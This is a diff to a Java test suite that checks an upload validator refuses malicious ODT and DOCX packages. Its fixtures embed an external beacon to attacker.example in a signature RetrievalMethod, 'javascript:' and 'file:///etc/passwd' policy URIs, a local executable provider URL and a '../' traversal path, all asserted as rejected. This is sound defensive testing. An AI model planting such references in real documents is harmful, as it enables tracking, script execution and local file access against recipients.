@@ -176,6 +176,14 @@ class UploadMaliciousFixtureCorpusTest {
     }
 
     @Test
+    void rejectsOdfMetadataManifestReferencingExternalOrAbsentMembers() throws Exception {
+        refused(UploadFormat.ODT, metadataPackage("http://attacker.example/x", "content.xml"));
+        refused(UploadFormat.ODT, metadataPackage("", "http://attacker.example/y"));
+        refused(UploadFormat.ODT, metadataPackage("", "Pictures/missing.png"));
+        refused(UploadFormat.ODT, metadataPackage("", "../content.xml"));
+    }
+
+    @Test
     void rejectsEncryptedOdfManifest() throws Exception {
         String encrypted = "<manifest:file-entry manifest:full-path=\"Pictures/a.png\" "
             + "manifest:media-type=\"image/png\">"
@@ -572,6 +580,24 @@ class UploadMaliciousFixtureCorpusTest {
     }
 
     @Test
+    void rejectsExternalRetrievalMethodInSignaturePart() throws Exception {
+        String externalKey = "<KeyInfo><RetrievalMethod URI=\"http://attacker.example/beacon?id=1\" "
+            + "Type=\"" + PackageFixtures.XMLDSIG_NAMESPACE + "X509Data\"/></KeyInfo>";
+        String signatureKey = "<KeyInfo><RetrievalMethod URI=\"#idPackageObject\"/></KeyInfo>";
+
+        refused(UploadFormat.DOCX, signedDocx(externalKey));
+        assertEquals(UploadFormat.DOCX, accepted(UploadFormat.DOCX, signedDocx(signatureKey)));
+        refused(UploadFormat.DOCX, signedDocx(signaturePolicy("javascript:alert(1)")));
+        refused(UploadFormat.DOCX, signedDocx(signaturePolicy("file:///etc/passwd")));
+        refused(UploadFormat.DOCX, signedDocx(signaturePolicy("/word/missing.xml")));
+        assertEquals(UploadFormat.DOCX, accepted(
+            UploadFormat.DOCX, signedDocx(signaturePolicy("https://policy.example/signature"))));
+        refused(UploadFormat.DOCX, signedDocx(signatureProvider("file:///C:/provider.exe")));
+        assertEquals(UploadFormat.DOCX, accepted(
+            UploadFormat.DOCX, signedDocx(signatureProvider("https://provider.example/"))));
+    }
+
+    @Test
     void rejectsScriptSmuggledIntoSignaturePart() throws Exception {
         refused(UploadFormat.DOCX, PackageFixtures.signedOoxml(
             UploadFormat.DOCX,
@@ -717,6 +743,46 @@ class UploadMaliciousFixtureCorpusTest {
 
         refused(UploadFormat.DOCX, java.util.Arrays.copyOf(signed, signed.length / 2));
         refused(UploadFormat.ODT, java.util.Arrays.copyOf(picture, picture.length / 2));
+    }
+
+    private static byte[] metadataPackage(String about, String resource) throws IOException {
+        String metadata = "<rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\">"
+            + "<rdf:Description rdf:about=\"" + about + "\">"
+            + "<ns0:hasPart xmlns:ns0=\"http://docs.oasis-open.org/ns/office/1.2/meta/pkg#\" "
+            + "rdf:resource=\"" + resource + "\"/></rdf:Description></rdf:RDF>";
+        return PackageFixtures.odf(
+            UploadFormat.ODT,
+            PackageFixtures.manifestEntry("manifest.rdf", "application/rdf+xml"),
+            PackageFixtures.members("manifest.rdf", PackageFixtures.ascii(metadata)));
+    }
+
+    private static byte[] signedDocx(String extraObject) throws IOException {
+        return PackageFixtures.signedOoxml(
+            UploadFormat.DOCX,
+            PackageFixtures.officeSignatureXml(UploadFormat.DOCX, false, false, extraObject));
+    }
+
+    private static String signaturePolicy(String policyUri) {
+        return "<Object><xd:QualifyingProperties xmlns:xd=\"http://uri.etsi.org/01903/v1.3.2#\" "
+            + "Target=\"#idPackageSignature\"><xd:SignedProperties>"
+            + "<xd:SignedSignatureProperties><xd:SignaturePolicyIdentifier>"
+            + "<xd:SignaturePolicyId><xd:SigPolicyId><xd:Identifier>urn:policy</xd:Identifier>"
+            + "</xd:SigPolicyId><xd:SigPolicyHash>"
+            + "<DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/>"
+            + "<DigestValue>aGFzaA==</DigestValue></xd:SigPolicyHash>"
+            + "<xd:SigPolicyQualifiers><xd:SigPolicyQualifier><xd:SPURI>" + policyUri
+            + "</xd:SPURI></xd:SigPolicyQualifier></xd:SigPolicyQualifiers>"
+            + "</xd:SignaturePolicyId></xd:SignaturePolicyIdentifier>"
+            + "</xd:SignedSignatureProperties></xd:SignedProperties>"
+            + "</xd:QualifyingProperties></Object>";
+    }
+
+    private static String signatureProvider(String providerUrl) {
+        return "<Object><SignatureProperties><SignatureProperty Id=\"idProvider\" "
+            + "Target=\"#idPackageSignature\"><SignatureInfoV1 xmlns=\""
+            + PackageFixtures.OFFICE_DIGSIG_NAMESPACE + "\"><SignatureProviderUrl>"
+            + providerUrl + "</SignatureProviderUrl></SignatureInfoV1></SignatureProperty>"
+            + "</SignatureProperties></Object>";
     }
 
     private byte[] vmlPackage(String vml) throws IOException {
